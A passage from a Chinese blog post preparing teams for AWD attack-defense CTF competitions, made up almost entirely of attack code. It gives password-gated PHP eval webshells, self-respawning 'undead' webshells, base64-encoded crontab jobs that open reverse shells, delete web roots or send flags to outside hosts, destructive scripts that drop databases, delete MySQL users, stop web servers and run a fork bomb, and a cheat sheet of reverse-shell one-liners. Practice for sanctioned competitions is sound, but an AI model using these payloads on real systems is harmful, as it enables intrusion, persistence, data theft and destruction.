class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br></pre></td><td class=code><pre><code class="hljs php"><span class=hljs-meta>&lt;?php</span><br><span class=hljs-keyword>if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class=hljs-variable>$_POST</span>[<span class=hljs-string>&#x27;pass&#x27;</span>])==<span class=hljs-string>&#x27;d8d1a1efe0134e2530f503028a825253&#x27;</span>)<br>@<span class=hljs-keyword>eval</span>(<span class=hljs-variable>$_POST</span>[<span class=hljs-string>&#x27;cmd&#x27;</span>]);<br><span class=hljs-meta>?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p>再利用header</p><figure class="highlight php"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br><span class=line>8</span><br></pre></td><td class=code><pre><code class="hljs php"><span class=hljs-meta>&lt;?php</span><br><span class=hljs-keyword>echo</span> <span class=hljs-string>&#x27;hello&#x27;</span>;<br><span class=hljs-keyword>if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class=hljs-variable>$_POST</span>[<span class=hljs-string>&#x27;pass&#x27;</span>])==<span class=hljs-string>&#x27;d8d1a1efe0134e2530f503028a825253&#x27;</span>)<br><span class=hljs-keyword>if</span> (@<span class=hljs-variable>$_SERVER</span>[<span class=hljs-string>&#x27;HTTP_USER_AGENT&#x27;</span>] == <span class=hljs-string>&#x27;flag&#x27;</span>)&#123;<br><span class=hljs-variable>$test</span>= <span class=hljs-string>&#x27;flag&#x27;</span>;<br><span class="hljs-title function_ invoke__">header</span>(<span class=hljs-string>&quot;flag:<span class=hljs-subst>$test</span>&quot;</span>);<br>&#125;<br><span class=hljs-meta>?&gt;</span><br></code></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>不死马</p><figure class="highlight php"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br><span class=line>8</span><br><span class=line>9</span><br><span class=line>10</span><br><span class=line>11</span><br><span class=line>12</span><br><span class=line>13</span><br></pre></td><td class=code><pre><code class="hljs php"><span class=hljs-meta>&lt;?php</span> <br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class=hljs-literal>true</span>);<span class=hljs-comment>//忽略与用户的断开</span><br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class=hljs-number>0</span>);<span class=hljs-comment>//设置脚本最大执行时间</span><br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class=hljs-keyword>__FILE__</span>);<span class=hljs-comment>//删除文件本身</span><br>    <span class=hljs-variable>$file</span> = <span class=hljs-string>&#x27;.3.php&#x27;</span>;<br>    <span class=hljs-variable>$code</span> = <span class=hljs-string>&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#x27;</span>;<br>    <span class=hljs-comment>//pass=pass</span><br>    <span class=hljs-keyword>while</span> (<span class=hljs-number>1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class=hljs-variable>$file</span>,<span class=hljs-variable>$code</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class=hljs-string>&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#x27;</span>);<span class=hljs-comment>//修改时间</span><br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class=hljs-number>5000</span>);<br>    &#125;<br><span class=hljs-meta>?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>利用base64和crontab的强不死马</p><figure class="highlight python"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br><span class=line>8</span><br><span class=line>9</span><br><span class=line>10</span><br><span class=line>11</span><br><span class=line>12</span><br><span class=line>13</span><br><span class=line>14</span><br><span class=line>15</span><br><span class=line>16</span><br><span class=line>17</span><br><span class=line>18</span><br><span class=line>19</span><br><span class=line>20</span><br><span class=line>21</span><br><span class=line>22</span><br><span class=line>23</span><br><span class=line>24</span><br><span class=line>25</span><br><span class=line>26</span><br><span class=line>27</span><br><span class=line>28</span><br><span class=line>29</span><br><span class=line>30</span><br><span class=line>31</span><br><span class=line>32</span><br><span class=line>33</span><br><span class=line>34</span><br><span class=line>35</span><br><span class=line>36</span><br><span class=line>37</span><br><span class=line>38</span><br></pre></td><td class=code><pre><code class="hljs python"><span class=hljs-comment>#!/usr/bin/env python3</span><br><span class=hljs-keyword>import</span> base64<br><br><span class=hljs-keyword>def</span> <span class="hljs-title function_">crontab_reverse</span>(<span class=hljs-params>reverse_ip, reverse_port</span>):<br>    crontab_path = <span class=hljs-string>&quot;/tmp&quot;</span><br>    cmd = <span class=hljs-string>&#x27;bash -i &gt;&amp; /dev/tcp/%s/%d 0&gt;&amp;1&#x27;</span> % (reverse_ip, reverse_port)<br>    crontab_cmd = <span class=hljs-string>&quot;* * * * * bash -c &#x27;%s&#x27;\n&quot;</span> % cmd<br>    encode_crontab_cmd = base64.b64encode(crontab_cmd)<br>    cmd = <span class=hljs-string>&quot;/bin/echo &quot;</span> + encode_crontab_cmd + <span class=hljs-string>&quot; | /usr/bin/base64 -d | /bin/cat &gt;&gt; &quot;</span> + crontab_path + <span class=hljs-string>&quot;/tmp_rev.conf&quot;</span> + <span class=hljs-string>&quot; ; &quot;</span> + <span class=hljs-string>&quot;/usr/bin/crontab &quot;</span> + crontab_path + <span class=hljs-string>&quot;/tmp.conf&quot;</span><br>    <span class=hljs-keyword>return</span> cmd<br><br><span class=hljs-keyword>def</span> <span class="hljs-title function_">crontab_rm</span>(<span class=hljs-params>rm_paths=<span class=hljs-string>&#x27;/var/www/html/&#x27;</span></span>):<br>    crontab_path = <span class=hljs-string>&quot;/tmp&quot;</span><br>    cmd = <span class=hljs-string>&#x27;/bin/rm -rf %s&#x27;</span> % rm_paths<br>    crontab_cmd = <span class=hljs-string>&quot;* * * * * %s\n&quot;</span> % cmd<br>    encode_crontab_cmd = base64.b64encode(crontab_cmd)<br>    cmd = <span class=hljs-string>&quot;/bin/echo &quot;</span> + encode_crontab_cmd + <span class=hljs-string>&quot; | /usr/bin/base64 -d | /bin/cat &gt;&gt; &quot;</span> + crontab_path + <span class=hljs-string>&quot;/tmp_rm.conf&quot;</span> + <span class=hljs-string>&quot; ; &quot;</span> + <span class=hljs-string>&quot;/usr/bin/crontab &quot;</span> + crontab_path + <span class=hljs-string>&quot;/tmp.conf&quot;</span><br>    <span class=hljs-keyword>return</span> cmd<br><br><span class=hljs-keyword>def</span> <span class="hljs-title function_">crontab_flag_submit</span>(<span class=hljs-params>flag_server, flag_port, flag_api, flag_token,</span><br><span class=hljs-params>                        flag_host</span>):<br>    crontab_path = <span class=hljs-string>&#x27;/tmp&#x27;</span><br>    cmd = <span class=hljs-string>&#x27;/usr/bin/curl &quot;http://%s:%s/%s&quot; -d &quot;token=%s&amp;flag=$(curl %s)&quot; &#x27;</span> % (<br>        flag_server, flag_port, flag_api, flag_token, flag_host)<br>    crontab_cmd = <span class=hljs-string>&quot;* * * * * %s\n&quot;</span> % cmd<br>    encode_crontab_cmd = base64.b64encode(crontab_cmd)<br>    cmd = <span class=hljs-string>&quot;/bin/echo &quot;</span> + encode_crontab_cmd + <span class=hljs-string>&quot; | /usr/bin/base64 -d | /bin/cat &gt;&gt; &quot;</span> + crontab_path + <span class=hljs-string>&quot;/tmp_submit.conf&quot;</span> + <span class=hljs-string>&quot; ; &quot;</span> + <span class=hljs-string>&quot;/usr/bin/crontab &quot;</span> + crontab_path + <span class=hljs-string>&quot;/tmp.conf&quot;</span><br>    <span class=hljs-keyword>return</span> cmd<br><br><span class=hljs-comment>#  cmd = crontab_flag_submit(flag_server=&#x27;0.0.0.0&#x27;,</span><br>                        <span class=hljs-comment>#  flag_port=&#x27;8888&#x27;,</span><br>                        <span class=hljs-comment>#  flag_api=&#x27;submit&#x27;,</span><br>                        <span class=hljs-comment>#  flag_token=&#x27;bcbe3365e6ac95ea2c0343a2395834dd&#x27;,</span><br>                        <span class=hljs-comment>#  flag_host=&#x27;http://192.168.100.1/Getkey&#x27;)</span><br><span class=hljs-comment>#  print(cmd)</span><br><br>cmd = crontab_reverse(<span class=hljs-string>&#x27;202.204.62.222&#x27;</span>,<span class=hljs-number>6666</span>)<br><span class=hljs-built_in>print</span>(cmd)<br></code></pre></td></tr></table></figure></li><li><p>冰蝎 <a target=_blank rel=noopener href=https://github.com/rebeyond>rebeyond</a>/<strong><a target=_blank rel=noopener href=https://github.com/rebeyond/Behinder>Behinder</a></strong></p></li></ul><h3 id=权限维持><a class=markdownIt-Anchor href=#权限维持></a> 权限维持</h3><ul><li><p>crontab</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br></pre></td><td class=code><pre><code class="hljs bash"><span class=hljs-comment># 编辑 crontab：crontab -e</span><br>*/5 * * * * curl 172.16.100.5:9000/submit_flag/ -d <span class=hljs-string>&#x27;flag=&#x27;</span>$(<span class=hljs-built_in>cat</span> /home/web/flag/flag)<span class=hljs-string>&#x27;&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY&#x27;</span><br><span class=hljs-comment># 查询 crontab：crontab -l</span><br></code></pre></td></tr></table></figure></li><li><p>藏在 <code>.config.php</code></p><figure class="highlight php"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br><span class=line>8</span><br><span class=line>9</span><br><span class=line>10</span><br><span class=line>11</span><br><span class=line>12</span><br><span class=line>13</span><br><span class=line>14</span><br></pre></td><td class=code><pre><code class="hljs php"><span class=hljs-meta>&lt;?php</span><br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class=hljs-number>0</span>);<br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class=hljs-literal>true</span>);<br><br> <span class=hljs-variable>$file</span> = <span class=hljs-string>&#x27;.conifg.php&#x27;</span>;<br> <span class=hljs-variable>$shell</span> = <span class=hljs-string>&quot;&lt;?php echo system(&quot;</span>curl <span class=hljs-number>10.0</span>.<span class=hljs-number>0.2</span><span class=hljs-string>&quot;); ?&gt;&quot;</span>;<br><br>    <span class=hljs-keyword>while</span>(<span class=hljs-literal>true</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class=hljs-variable>$file</span>, <span class=hljs-variable>$shell</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class=hljs-string>&#x27;chmod 777 .demo.php&#x27;</span>);<br><br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class=hljs-number>50</span>);<br>        &#125;<br><span class=hljs-meta>?&gt;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id=优雅地获取-flag><a class=markdownIt-Anchor href=#优雅地获取-flag></a> 优雅地获取 flag</h3><ol><li><p>通过 header 头：<br>在 config.php 中加入：</p><figure class="highlight php"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs php"><span class="hljs-title function_ invoke__">header</span>(<span class=hljs-string>&#x27;flag:&#x27;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class=hljs-string>&#x27;/tmp/flag&#x27;</span>));<br></code></pre></td></tr></table></figure><p>则可以访问任何一个页面均可从 header 头中读取 flag。</p></li><li><p>通过 gamebox 提交：<br>写 crontab 后门，例如：</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs bash">*/5 * * * * curl [ip]/flag -d <span class=hljs-string>&#x27;flag=$(cat /tmp/flag)&#x27;</span> &amp; token=[队伍 token]<span class=hljs-string>&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>文件包含</p></li><li><p>在 404 等难以发现的页面中，直接使用 <code>echo 'cat /f*'</code> 命令。</p><ul><li>更加优雅的方式是用 HTML 标签将其隐藏，然后用正则匹配找出：</li></ul><figure class="highlight html"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs html"><span class=hljs-tag>&lt;<span class=hljs-name>input</span> <span class=hljs-attr>type</span>=<span class=hljs-string>&quot;hidden&quot;</span> <span class=hljs-attr>name</span>=<span class=hljs-string>&#x27;&lt;?php echo &#x27;</span><span class=hljs-attr>cat</span> /<span class=hljs-attr>flag</span>&#x27;;?&gt;</span>&#x27; value=&quot;Sign In&quot; class=&quot;btn btn-primary&quot;&gt;<br></code></pre></td></tr></table></figure></li><li><p>利用 copy，在 index.php 中加入如下语句：</p><figure class="highlight php"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs php"><span class="hljs-title function_ invoke__">copy</span>(<span class=hljs-string>&#x27;/flag&#x27;</span>,<span class=hljs-string>&#x27;/var/www/html/.1.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><p>但是这样会让 flag 被其他队伍获取，所以可以在 index.php 上在加上：</p><figure class="highlight php"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br></pre></td><td class=code><pre><code class="hljs php"><span class=hljs-keyword>if</span>(<span class=hljs-keyword>isset</span>(<span class=hljs-variable>$_GET</span>[<span class=hljs-string>&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class=hljs-number>.1</span>.txt);<br>&#125;<br></code></pre></td></tr></table></figure><p>这样读取 flag 的内容后，立即用 GET 请求，即可删除 <code>.1.txt</code>.</p></li><li><p>另类的 webshell</p><figure class="highlight php"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br></pre></td><td class=code><pre><code class="hljs php"><span class=hljs-meta>&lt;?php</span>&gt;<br><span class=hljs-variable>$str</span>=<span class=hljs-string>&quot;sesa&quot;</span>;<br><span class=hljs-variable>$aa</span>=<span class="hljs-title function_ invoke__">str_shuffle</span>(<span class=hljs-variable>$str</span>).<span class=hljs-string>&#x27;rt&#x27;</span>;<br>@<span class=hljs-variable>$aa</span>(<span class=hljs-variable>$_GET</span>[<span class=hljs-number>1</span>]);<br><span class=hljs-meta>?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>不复用 shell</p><figure class="highlight python"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br></pre></td><td class=code><pre><code class="hljs python">url=<span class=hljs-string>&#x27;http://10.10.10.&#x27;</span>+<span class=hljs-built_in>str</span>(i)+<span class=hljs-string>&quot;/links.html.php&quot;</span><br>myshellpath=<span class=hljs-string>&quot;testawd&quot;</span>+<span class=hljs-built_in>str</span>(i)<br>passis=md5(myshellpath)<br>data=&#123;passis:<span class=hljs-string>&#x27;echo file_get_contents(&quot;/home/flag&quot;)&#x27;</span>&#125;<br>a=requests.post(url=url,data=data)<br></code></pre></td></tr></table></figure></li></ol><h3 id=搅屎><a class=markdownIt-Anchor href=#搅屎></a> 搅屎</h3><ul><li><p>无限复制</p><figure class="highlight php"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br><span class=line>8</span><br></pre></td><td class=code><pre><code class="hljs php"><span class=hljs-meta>&lt;?php</span><br>  <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class=hljs-number>0</span>);<br>  <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class=hljs-literal>true</span>);<br>  <span class=hljs-keyword>while</span>(<span class=hljs-number>1</span>)&#123;<br>      <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-title function_ invoke__">randstr</span>().<span class=hljs-string>&#x27;.php&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_content</span>(<span class=hljs-keyword>__FILE__</span>));<br>      <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class=hljs-string>&quot;http://127.0.0.1/&quot;</span>);<br>  &#125;<br><span class=hljs-meta>?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>修改数据库密码</p><figure class="highlight sql"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br></pre></td><td class=code><pre><code class="hljs sql"><span class=hljs-keyword>update</span> mysql.user <span class=hljs-keyword>set</span> authentication_string<span class=hljs-operator>=</span>PASSWORD(<span class=hljs-string>&#x27;p4rr0t&#x27;</span>);# 修改所有用户密码<br>flush privileges;<br><span class=hljs-keyword>UPDATE</span> mysql.user <span class=hljs-keyword>SET</span> <span class=hljs-keyword>User</span><span class=hljs-operator>=</span><span class=hljs-string>&#x27;aaaaaaaaaaaa&#x27;</span> <span class=hljs-keyword>WHERE</span> <span class=hljs-keyword>user</span><span class=hljs-operator>=</span><span class=hljs-string>&#x27;root&#x27;</span>; <br>flush privileges;<br><span class=hljs-keyword>delete</span> <span class=hljs-keyword>from</span> mysql.user ;#删除所有用户<br>flush privileges;<br></code></pre></td></tr></table></figure></li><li><p>重启 apache2 和 nigix</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br></pre></td><td class=code><pre><code class="hljs bash"><span class=hljs-meta>#!/usr/bin/env sh</span><br><span class=hljs-keyword>while</span> [[ 1 ]]<br><span class=hljs-keyword>do</span><br>    service apache2 stop<br>    service nginx stop<br><span class=hljs-keyword>done</span> &amp;<br></code></pre></td></tr></table></figure></li><li><p>循环删除</p><figure class="highlight python"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br><span class=line>8</span><br><span class=line>9</span><br><span class=line>10</span><br><span class=line>11</span><br><span class=line>12</span><br><span class=line>13</span><br><span class=line>14</span><br><span class=line>15</span><br><span class=line>16</span><br><span class=line>17</span><br><span class=line>18</span><br><span class=line>19</span><br><span class=line>20</span><br><span class=line>21</span><br><span class=line>22</span><br><span class=line>23</span><br><span class=line>24</span><br></pre></td><td class=code><pre><code class="hljs python">&lt;?php<br>    set_time_limit(<span class=hljs-number>0</span>);<br>    ignore_user_abort(<span class=hljs-number>1</span>);<br>    unlink(__FILE__);<br>    function getfiles($path)&#123;<br>        foreach(glob($path) <span class=hljs-keyword>as</span> $afile)&#123;<br>            <span class=hljs-keyword>if</span>(is_dir($afile))<br>                getfiles($afile.<span class=hljs-string>&#x27;/*.php&#x27;</span>);<br>            <span class=hljs-keyword>else</span><br><span class=hljs-meta>                @file_put_contents(<span class=hljs-params>$afile,<span class=hljs-string>&quot;#Anything#&quot;</span></span>);</span><br>                //unlink($afile);<br>        &#125;<br>    &#125;<br>    <span class=hljs-keyword>while</span>(<span class=hljs-number>1</span>)&#123;<br>        getfiles(__DIR__);<br>        sleep(<span class=hljs-number>10</span>);<br>    &#125;<br>?&gt;<br>  <br>&lt;?php<br>    set_time_limit(<span class=hljs-number>0</span>);<br>    ignore_user_abort(<span class=hljs-number>1</span>);<br>    array_map(<span class=hljs-string>&#x27;unlink&#x27;</span>, glob(<span class=hljs-string>&quot;some/dir/*.php&quot;</span>));<br>?&gt;<br></code></pre></td></tr></table></figure></li><li><p>删除数据库</p><figure class="highlight python"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br><span class=line>8</span><br><span class=line>9</span><br></pre></td><td class=code><pre><code class="hljs python"><span class=hljs-comment>#!/usr/bin/env python3</span><br>  <span class=hljs-keyword>import</span> base64<br>  <span class=hljs-keyword>def</span> <span class="hljs-title function_">rm_db</span>(<span class=hljs-params>db_user,my_db_passwd</span>):<br>      cmd = <span class=hljs-string>&quot;/usr/bin/mysql -h localhost -u%s %s -e &#x27;&quot;</span>%(db_user,my_db_passwd)<br>      db_name = [<span class=hljs-string>&#x27;performance_schema&#x27;</span>,<span class=hljs-string>&#x27;mysql&#x27;</span>,<span class=hljs-string>&#x27;flag&#x27;</span>]<br>      <span class=hljs-keyword>for</span> db <span class=hljs-keyword>in</span> db_name:<br>          cmd += <span class=hljs-string>&quot;drop database %s;&quot;</span>%db<br>      cmd += <span class=hljs-string>&quot;&#x27;&quot;</span><br>      <span class=hljs-keyword>return</span> cmd<br></code></pre></td></tr></table></figure></li><li><p>fork_bomb</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br></pre></td><td class=code><pre><code class="hljs bash"><span class=hljs-meta>#!/bin/sh</span><br>/bin/echo <span class=hljs-string>&#x27;.() &#123; .|.&amp; &#125; &amp;&amp; .&#x27;</span> &gt; /tmp/aaa;/bin/bash /tmp/aaa;<br></code></pre></td></tr></table></figure></li><li><p>Webshell_Boss.php 蠕虫病毒<a target=_blank rel=noopener href=https://github.com/PlutoaCharon>PlutoaCharon</a>/<strong><a target=_blank rel=noopener href=https://github.com/PlutoaCharon/AWD-Attack-Defense>AWD-Attack-Defense</a></strong>/<a target=_blank rel=noopener href=https://github.com/PlutoaCharon/AWD-Attack-Defense/blob/master/Webshell_Boss.php>Webshell_Boss.php</a></p></li></ul><h3 id=反弹shell><a class=markdownIt-Anchor href=#反弹shell></a> 反弹shell</h3><ul><li><p>最简单</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs bash">bash -c <span class=hljs-string>&#x27;bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>shell</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br></pre></td><td class=code><pre><code class="hljs bash">nc -e /bin/bash 1.3.3.7 4444<br>bash -c <span class=hljs-string>&#x27;bash -i &gt;/dev/tcp/1.3.3.7/4444 0&gt;&amp;1&#x27;</span><br>zsh -c <span class=hljs-string>&#x27;zmodload zsh/net/tcp &amp;&amp; ztcp 1.3.3.7 4444 &amp;&amp; zsh &gt;&amp;$REPLY 2&gt;&amp;$REPLY 0&gt;&amp;$REPLY&#x27;</span><br>socat <span class=hljs-built_in>exec</span>:<span class=hljs-string>&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:1.3.3.7:4444<br></code></pre></td></tr></table></figure></li><li><p>python</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs bash">python -c <span class=hljs-string>&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_REAM);s.connect((&quot;127.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>php</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs bash">php -r <span class=hljs-string>&#x27;$sock=fsockopen(&quot;your_ip&quot;,&quot;4444&quot;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>windows</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs bash">nc.exe -e /bin/bash 1.3.3.7 4444<br></code></pre></td></tr></table></figure></li></ul><h2 id=参考资料><a class=markdownIt-Anchor href=#参考资料></a> 参考资料</h2><ul><li><a target=_blank rel=noopener href=https://www.bilibili.com/video/BV1XK4y1m7xA>A7enger战队_AWD赛前培训</a></li><li><a target=_blank rel=noopener href=https://github.com/admintony>admintony</a>/<strong><a target=_blank rel=noopener href=https://github.com/admintony/Prepare-for-AWD>Prepare-for-AWD</a></strong></li><li><a target=_blank rel=noopener href=https://www.cnblogs.com/sstfy/p/11853919.html>CTF中的AWD套路</a></li><li><a target=_blank rel=noopener href=http://zeroyu.xyz/2018/05/24/ctf-awd-note/ >CTF AWD模式攻防Note</a></li><li><a target=_blank rel=noopener href=https://www.cnblogs.com/Cl0ud/p/13620537.html>AWD不死马与克制方法</a></li><li><a target=_blank rel=noopener href=https://dyf.netlify.app/2019/08/23/%E8%93%9D%E5%B8%BD%E6%9D%AFawd%E6%80%BB%E7%BB%93/ >蓝帽杯awd总结</a></li><li>《从0到1，CTFer成长之路》</li></ul></div><hr><div><div class="post-metas my-3"><div class="post-meta mr-3 d-flex align-items-center"><i class="iconfont icon-category"></i> <span class=category-chains><span class=category-chain><a href=/categories/%E6%95%99%E7%A8%8B/ class=category-chain-item>教程</a></span></span></div><div class=post-meta><i class="iconfont icon-tags"></i> <a href=/tags/CTF/ class=print-no-link>#CTF</a> <a href=/tags/AWD/ class=print-no-link>#AWD</a></div></div><div class="license-box my-3"><div class=license-title><div>AWD 赛前准备</div><div>https://justloseit.top/AWD 赛前准备/</div></div><div class=license-meta><div class=license-meta-item><div>作者</div><div>Mobilis In Mobili</div></div><div class="license-meta-item license-meta-date"><div>发布于</div><div>2021年7月10日</div></div><div class="license-meta-item license-meta-date"><div>更新于</div><div>2022年11月22日</div></div><div class=license-meta-item><div>许可协议</div><div><a class=print-no-link target=_blank href=https://creativecommons.org/licenses/by-sa/4.0/ ><span class="hint--top hint--rounded" aria-label="BY - 署名"><i class="iconfont icon-cc-by"></i> </span></a><a class=print-no-link target=_blank href=https://creativecommons.org/licenses/by-sa/4.0/ ><span class="hint--top hint--rounded" aria-label="SA - 相同方式共享"><i class="iconfont icon-cc-sa"></i></span></a></div></div></div><div class="license-icon iconfont"></div></div><div class="post-prevnext my-3"><article class="post-prev col-6"><a href=/%E8%AE%A1%E7%AE%97%E7%90%86%E8%AE%BA%E5%A4%87%E5%BF%98/ title=计算理论备忘><i class="iconfont icon-arrowleft"></i> <span class=hidden-mobile>计算理论备忘</span> <span class=visible-mobile>上一篇</span></a></article><article class="post-next col-6"><a href=/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%87%E5%BF%98/ title=对称密码学备忘><span class=hidden-mobile>对称密码学备忘</span> <span class=visible-mobile>下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article id=comments><div id=valine></div><script type=text/javascript>Fluid.utils.loadComments("#valine",function(){Fluid.utils.createScript("https://lib.baomitu.com/valine/1.5.1/Valine.min.js",function(){var i=Object.assign({appId:"t4w421aIGl2GXkT0tSGoap5I-gzGzoHsz",appKey:"BpNeeVt0v3tKAbF1L6RTf94X",path:"window.location.pathname",placeholder:"说点什么",avatar:"hide",meta:["nick","mail","link"],requiredFields:[],pageSize:10,lang:"zh-CN",highlight:!0,recordIP:!1,serverURLs:"https://t4w421ai.lc-cn-n1-shared.com",emojiCDN:null,emojiMaps:null,enableQQ:!1},{el:"#valine",path:window.location.pathname});new Valine(i),Fluid.utils.waitElementVisible("#valine .vcontent",()=>{var i="#valine .vcontent img:not(.vemoji)";Fluid.plugins.imageCaption(i),Fluid.plugins.fancyBox(i)})})})</script><noscript>Please enable JavaScript to view the comments</noscript></article></article></div></div></div><div class="side-col d-none d-lg-block col-lg-2"><aside class=sidebar style=margin-left:-1rem><div id=toc><p class=toc-header><i class="iconfont icon-list"></i> <span>目录</span></p><div class=toc-body id=toc-body></div></div></aside></div></div></div><a id=scroll-top-button aria-label=TOP href=# role=button><i class="iconfont icon-arrowup" aria-hidden=true></i></a><div class="modal fade" id=modalSearch tabindex=-1 role=dialog aria-labelledby=ModalLabel aria-hidden=true><div class="modal-dialog modal-dialog-scrollable modal-lg" role=document><div class=modal-content><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type=button id=local-search-close class=close data-dismiss=modal aria-label=Close><span aria-hidden=true>&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type=text id=local-search-input class="form-control validate"> <label data-error=x data-success=v for=local-search-input>关键词</label></div><div class=list-group id=local-search-result></div></div></div></div></div></main><footer><div class=footer-inner><div class=footer-content><a href=https://hexo.io target=_blank rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href=https://github.com/fluid-dev/hexo-theme-fluid target=_blank rel="nofollow noopener"><span>Fluid</span></a></div><div class=statistics><span id=leancloud-site-pv-container style=display:none>总访问量 <span id=leancloud-site-pv></span> 次 </span><span id=leancloud-site-uv-container style=display:none>总访客数 <span id=leancloud-site-uv></span> 人</span></div><div class=beian><span><a href=http://beian.miit.gov.cn/ target=_blank rel="nofollow noopener"><a target=_blank rel=noopener href=https://beian.miit.gov.cn>京ICP备2021006744号-1</a> </a></span><span><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=11010802034644" rel="nofollow noopener" class=beian-police target=_blank><span style=visibility:hidden;width:0>|</span> <img src=/img/police_beian.png alt=police-icon> <span>京公网安备 11010802034644号</span></a></span></div></div></footer><script src=https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js></script><link rel=stylesheet 